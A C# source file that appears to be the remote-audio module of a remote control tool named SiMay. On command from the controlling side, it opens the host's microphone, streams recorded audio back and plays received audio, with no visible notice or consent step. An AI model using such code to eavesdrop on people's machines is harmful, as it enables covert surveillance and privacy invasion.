﻿using System;
using SiMay.Core;
using SiMay.ModelBinder;
using SiMay.Net.SessionProvider;
using SiMay.Platform.Windows;
using SiMay.ServiceCore.Attributes;

namespace SiMay.ServiceCore
{
    [ServiceName("远程语音")]
    [ApplicationKeyAttribute(ApplicationKeyConstant.REMOTE_AUDIO)]
    public class AudioService : ApplicationRemoteService
    {
        private bool _isRun = true;
        private bool _isPlaying = false;
        private WinSoundRecord _Recorder = null;
        private WinSoundPlayer _Player = null;
        public override void SessionInited(SessionProviderContext session)
        {

        }

        public override void SessionClosed()
        {
            _isRun = false;
            this.Dispose();
        }
        private void OpenAudio(int samplesPerSecond, int bitsPerSample, int channels)
        {
            int inDeviceOpen = 0;
            int outDeviceOpen = 0;
            try
            {
                string waveInDeviceName = WinSound.GetWaveInDeviceNames().Count > 0 ? WinSound.GetWaveInDeviceNames()[0] : null;
                if (waveInDeviceName != null)
                {
                    _Recorder = new WinSoundRecord();
                    _Recorder.DataRecorded += Recorder_DataRecorded;
                    _Recorder.Open(waveInDeviceName, samplesPerSecond, bitsPerSample, channels, 1280, 8);
                }
                else
                {
                    inDeviceOpen = 1;
                }
            }
            catch { }

            try
            {
                string waveOutDeviceName = WinSound.GetWaveOutDeviceNames().Count > 0 ? WinSound.GetWaveOutDeviceNames()[0] : null;
                if (waveOutDeviceName != null)
                {
                    _Player = new WinSoundPlayer();
                    _Player.Open(waveOutDeviceName, samplesPerSecond, bitsPerSample, channels, 1280, 8);
                }
                else
                {
                    outDeviceOpen = 1;
                }
            }
            catch { }

            CurrentSession.SendTo(MessageHead.C_AUDIO_DEVICE_OPENSTATE,
                new AudioDeviceStatesPacket()
                {
                    PlayerEnable = outDeviceOpen == 0,
                    RecordEnable = inDeviceOpen == 0
                });
        }

        private void Recorder_DataRecorded(byte[] bytes)
        {
            if (_isPlaying == true)
                return;

            CurrentSession.SendTo(MessageHead.C_AUDIO_DATA, bytes);
        }

        [PacketHandler(MessageHead.S_AUDIO_START)]
        public void SetOpenAudioInConfig(SessionProviderContext session)
        {
            var config = session.GetMessageEntity<AudioOptionsPacket>();
            this.OpenAudio(config.SamplesPerSecond, config.BitsPerSample, config.Channels);
        }

        [PacketHandler(MessageHead.S_AUDIO_DEIVCE_ONOFF)]
        public void SetAudioState(SessionProviderContext session)
        {
            var state = session.GetMessage().ToUnicodeString();
            if (state == "0")
                _isPlaying = true;
            else if (state == "1")
                _isPlaying = false;
        }

        [PacketHandler(MessageHead.S_AUDIO_DATA)]
        public void PlayerData(SessionProviderContext session)
        {
            byte[] payload = session.GetMessage();
            try
            {
                if (!_isRun || _Player == null || _isPlaying == false) return; //正在录音不播放

                _Player.PlayData(payload);
            }
            catch { }
        }

        private void Dispose()
        {
            _isRun = false;
            try
            {
                if (_Player != null)
                    _Player.Close();
            }
            catch { }
            try
            {
                if (_Recorder != null)
                    _Recorder.Stop();
            }
            catch { }
        }
    }
}